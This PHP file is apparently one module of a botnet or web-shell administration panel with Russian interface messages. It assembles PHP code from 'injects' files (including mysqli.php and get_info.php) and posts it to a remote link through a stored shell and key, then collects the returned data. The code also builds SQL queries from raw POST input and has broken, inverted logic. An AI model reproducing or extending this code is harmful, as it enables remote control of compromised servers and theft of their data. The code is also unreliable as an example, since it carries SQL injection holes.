<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell, name FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
        if(!isset($_POST['key']) && empty($_POST['key'])) $_POST['key'] = $result->keyid;
        if(!isset($_POST['name']) && empty($_POST['name'])) $_POST['name'] = $result->name;
        if(!isset($_POST['link']) && empty($_POST['link'])) $_POST['link'] = $result->link;
        if(!isset($_POST['shell']) && empty($_POST['shell'])) $_POST['shell'] = $result->shell;
		if(isset($_POST['submit']) && !empty($_POST['link']) && !empty($_POST['key'])){
				$bad_form['name'] = 'Клиент не может быть пустой.';
				$FORM_BAD = 1;
			}else{
				if(strlen($_POST['name']) > 32){
					$bad_form['name'] = 'Клиент не может быть больше 32 символов.';
					$FORM_BAD = 1;
				}
			}

			$link = $mysqli->query("SELECT link FROM bf_admins WHERE (link='".$_POST['link']."')");
			if($_POST['link'] != $result->link && $link->link == $_POST['link']){
				$FORM_BAD = 1;
			}else{
				$get_php .= file_get_contents('modules/admins/injects/start.php');
				$get_php .= "print('OK');";
				$answer = get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']);
				//file_put_contents('1.txt', $answer . "\r\n" . print_r($_POST, true));
				if($answer != 'OK'){
					$FORM_BAD = 1;
				}else{
					$get_php .= file_get_contents('modules/admins/injects/start.php');
					$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
					$get_php .= file_get_contents('modules/admins/injects/get_info.php');
					$cbots = json_decode(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']), true);
				}
			}

			if($FORM_BAD <> 1){
				$result->link = $_POST['link'];
				$smarty->assign("registration_end", true);
			}else{
					for($i = 0; $i < count($bad_form); $i++){
						$errors .= '<div class="t"><div class="t4" align="center">' . $bad_form[$i] . '</div></div>';
					}
				}
			}
			$smarty->assign("account_errors", $errors);
		}

		$smarty->assign('admin', $result);
		$smarty->assign('users', json_decode($users, false));
	}
}

?>